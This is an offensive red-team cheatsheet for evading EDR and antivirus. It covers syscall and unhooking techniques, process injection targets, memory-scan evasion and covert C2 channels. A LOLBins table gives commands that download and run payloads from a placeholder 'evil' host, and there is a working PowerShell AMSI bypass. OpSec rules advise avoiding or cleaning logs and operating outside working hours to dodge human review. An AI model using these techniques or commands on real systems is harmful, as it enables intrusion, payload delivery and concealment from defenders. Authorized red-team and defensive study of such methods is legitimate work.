# EDR/AV Bypass and Covert Operations Cheatsheet

> Source: distilled red team field experience (2024-2026)
> When to use: reference when you need to operate in environments protected by EDR/AV

---

## Detection Layers and Corresponding Bypasses

| Detection layer | What EDR does | Bypass approach |
|--------|-----------|---------|
| Static signatures | Matches known malware hashes/characteristics | Custom compilation, encrypted payloads, altering characteristics |
| User-mode hooks | Hooks ntdll.dll to monitor API calls | Direct syscalls / Unhooking / bring your own ntdll |
| Kernel callbacks | Registers process/thread/image-load callbacks | Callback removal (needs a driver) / inject into legitimate processes |
| ETW | Collects events via ETW | Patch EtwEventWrite / disable providers |
| Behavior analysis | Analyzes call sequences and behavior patterns | Delayed execution / spread operations / mimic normal behavior |
| Memory scanning | Periodically scans process memory | Heap encryption / encrypt payload during Sleep / module stomping |
| Network detection | Analyzes outbound traffic characteristics | Domain fronting / legitimate service tunneling / encryption |

---

## Practical Bypass Techniques

### 1. Direct Syscalls (bypass user-mode hooks)

```
How it works: skip ntdll.dll, call the kernel directly with the syscall instruction
Tools: SysWhispers3 / HellsGate / TartarusGate
Effect: bypasses all user-mode hooks
```

### 2. Unhooking (restore original ntdll)

```
Method A: remap ntdll.dll from disk
Method B: load a clean copy from the KnownDlls directory
Method C: copy the .text section from a suspended process
Effect: restore hooked APIs to their original state
```

### 3. Process Injection (pick low-monitoring targets)

```
Recommended targets (low monitoring):
- RuntimeBroker.exe
- sihost.exe
- taskhostw.exe
- explorer.exe (slightly higher risk)

Avoid injecting:
- lsass.exe (heavily monitored)
- svchost.exe (some EDRs focus on it)
- powershell.exe / cmd.exe
```

### 4. Module Stomping

```
How it works: write the payload into the .text section of an already-loaded legitimate DLL
Effect: memory scans see a legitimate module, not suspicious RWX memory
```

### 5. Sleep Encryption (Ekko/Zilean)

```
How it works: encrypt own memory during beacon sleep
Effect: memory scans cannot find the payload signature
Implementation: register a timer callback, encrypt before sleep, decrypt on wake
```

### 6. Call Stack Spoofing

```
How it works: forge the call stack so API calls appear to come from legitimate code
Effect: bypasses call-stack-based behavior detection
```

---

## C2 Traffic Covertness

| Technique | How it works | Detection difficulty |
|------|------|---------|
| Domain fronting | HTTPS request SNI and Host header differ | High |
| Cloudflare Workers | Relayed through CF, looks like normal HTTPS | High |
| Azure/AWS legitimate services | Uses cloud service APIs as C2 channel | Very high |
| DNS over HTTPS | C2 data encoded in DNS queries | Medium |
| WebSocket | Long-lived connection mixed into normal web traffic | Medium |
| ICMP tunneling | Data hidden inside ICMP packets | Low (easy to spot) |

---

## LOLBins (Living Off the Land)

Abuse legitimate system programs to perform malicious actions:

| Program | Purpose | Example command |
|------|------|---------|
| certutil | Download files | `certutil -urlcache -split -f http://evil/payload.exe` |
| mshta | Execute HTA | `mshta http://evil/payload.hta` |
| rundll32 | Load DLL | `rundll32 evil.dll,EntryPoint` |
| regsvr32 | Load SCT | `regsvr32 /s /n /u /i:http://evil/file.sct scrobj.dll` |
| wmic | Remote execution | `wmic /node:target process call create "cmd"` |
| msiexec | Install MSI | `msiexec /q /i http://evil/payload.msi` |
| bitsadmin | Download files | `bitsadmin /transfer job http://evil/payload.exe C:\payload.exe` |
| forfiles | Execute commands | `forfiles /p c:\windows /m notepad.exe /c "cmd /c calc.exe"` |

---

## AMSI Bypass (PowerShell)

```powershell
# Classic patch (may be caught by signature detection)
$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b = $a.GetField('amsiInitFailed','NonPublic,Static')
$b.SetValue($null,$true)

# More covert: reflectively patch AmsiScanBuffer
# or downgrade PowerShell to v2 (no AMSI)
powershell -version 2
```

---

## OpSec Principles

1. **Minimal action** — don't touch what you don't have to; reuse existing credentials instead of creating new ones
2. **Time windows** — operate outside the target's working hours (reduce chance of human review)
3. **Traffic blending** — make C2 communication frequency and size mimic normal business traffic
4. **No tools on disk** — execute in memory, clean up after use
5. **Log awareness** — know which actions produce which logs; avoid them in advance or clean up afterward
6. **Honeypot recognition** — identify honeypots before acting (abnormally open services, too-tempting credentials)
7. **Segmented operations** — don't do everything in one shot; spread actions across multiple time periods

